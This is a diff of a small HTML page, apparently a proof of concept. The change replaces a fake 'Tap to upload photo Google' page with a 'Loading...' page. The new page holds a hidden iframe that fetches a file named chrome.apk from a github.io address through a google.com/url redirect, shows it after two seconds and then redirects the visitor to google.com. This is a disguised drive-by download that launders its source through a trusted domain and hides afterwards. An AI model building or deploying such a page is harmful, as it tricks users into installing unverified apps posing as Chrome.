@@ -5,124 +5,26 @@
         margin: 1em;
     }
 
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
-    input {
+    iframe {
         display: none;
-    }
-
-    img {
         width: 100%;
+        height: 600px;
+        border: 0;
     }
 </style>
 
-<h1>Tap to upload photo  Google</h1>
+<h1>Loading...</h1>
 
-<!-- [poc-with-system-dialog]: -->
-<input id="fileSelect" type="file" accept="image/*" />
+<iframe id="frame" src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"></iframe>
 
-<!-- [poc-with-camera]: -->
-<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
-
-<img id="img">
-<a id="link" href="https://google.com" target="_blank"></a>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" width="100%" height="600px" frameborder="0">
-
-</iframe>
 <script>
-    link.onclick = () => {
-        fileSelect.click();
-    }
+    // Tampilkan iframe setelah 2 detik
+    setTimeout(() => {
+        document.getElementById("frame").style.display = "block";
+    }, 2000);
 
-    fileSelect.onchange = (event) => {
-        img.src = URL.createObjectURL(fileSelect.files[0]);
-    }
+    // Redirect ke Google setelah 4 detik
+    setTimeout(() => {
+        window.location.href = "https://google.com";
+    }, 4000);
 </script>
